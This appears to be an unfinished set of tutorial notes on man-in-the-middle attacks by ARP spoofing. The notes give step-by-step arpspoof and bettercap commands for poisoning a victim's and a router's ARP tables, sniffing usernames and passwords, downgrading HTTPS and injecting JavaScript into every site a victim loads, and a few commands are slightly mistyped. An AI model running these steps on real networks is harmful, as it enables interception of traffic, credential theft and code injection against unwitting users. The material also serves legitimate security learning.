# MITM attacks (Man In The Midle) - ARP spoofing

### What ARP is?

ARP (Address Resolution Protocol) is a protocol used to map an IP address to a MAC address. It is used to find the hardware address of a host from a known IP address.

### What is ARP spoofing?

ARP spoofing is a type of attack in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages to the target machine and to the default gateway. By doing so, the gateway (router) thinks that the attacker's MAC address is the address of the target machine and the target machine thinks that the attacker's MAC address is the address of the gateway. This way, the attacker can intercept the traffic between the target and the gateway.

## ARP spoofing using arpspoof

### Usage:
```
$ arpspoof -i <interface> -t <target-ip> <gateway-ip>
$ arpspoof -i <interface> -t <gateway-ip> <target-ip>
```

> **_NOTE:_**<br>
> By default, the linux kernel does not forward packets between interfaces. <br>
> We want our machine to act as a router, so we need to enable packet forwarding by running the following command:
> ```
> $ echo 1 > /proc/sys/net/ipv4/ip_forward
> ```

### Attack example:
- victim ip address (the target): 192.168.1.10
- gateway ip address (the router): 192.168.1.1
- interface: eth0

1. Enable IP forwarding
```
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```

2. Launch an ARP spoofing attack to the victim:
```
$ arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
# this command changes the arp table of the target (victim)
```

3. Launch an ARP spoofing attack to the gateway:
```
$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 
# this command changes the arp table of the gateway (router)
```

## ARP spoofing using bettercap

### What is bettercap?

Bettercap is a powerful framework for network attacks and monitoring. It offers more features than arpspoof like:
- ARP spoofing
- Sniff data (url, username, password, ...)
- Bypass HTTPS
- Redirect domain requests (DNS spoofing)
- Inject code in loaded pages
- And more...

It is organized in modules, each module has its own commands and options.

### Install bettercap if not installed
```
$ apt get install bettercap
```

### Usage:
To launch bettercap run: 
```
$ bettercap -iface <interface>
```

> **_NOTE:_**<br>
> To get help about bettercap usage type `help` in the bettercap console.<br>
> To get help about a specific module type `help <module-name>`.

### Attack example:

- interface: eth0

1. Launch bettercap
```
$ bettercap -iface eth0
```

2. Turn on the probe module<br>
The probe module keeps probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet.
```
$ net.probe on
```
> **_NOTE:_**<br>
> The probe module automatically turns the net.recon module on.<br>
> The net.recon module periodically reads the ARP cache in order to monitor for new hosts on the network.

> **_NOTE:_**<br>
> To show a list of all connected clients on the network type:<br>
> ```
> $ net.show
> ```
> 
TODO: CONTINUE HERE

- set arp spoofing parameters
```
$ set arp.spoof.fullduplex true
$ set arp.spoof.targets <target-ip1>,<target-ip2>,...
```

- turn on arp spoof module
```
$ arp.spoof on
```

- capture requests
```
$ net.sniff on
```

you can also run bettercap by passing a text file with all commands to execute
```
$ bettercap -iface <interface> -caplet spoof.cap
```
the spoof.cap constains all the previous commands

## Downgrade https to http
```
$ hstshijack/hstshijack
```

## JS injection

- To inject js add the js file to the payload in the 'set hstshijack.payloads' in the file /usr/share/bettercap/caplets/hstshijack/hstshijack.cap

```
*:<path_to_js_file>
```
the star means that the file is injected in every website; to inject only in a specific website do this:
```
<website>:<path_to_js_file>
```
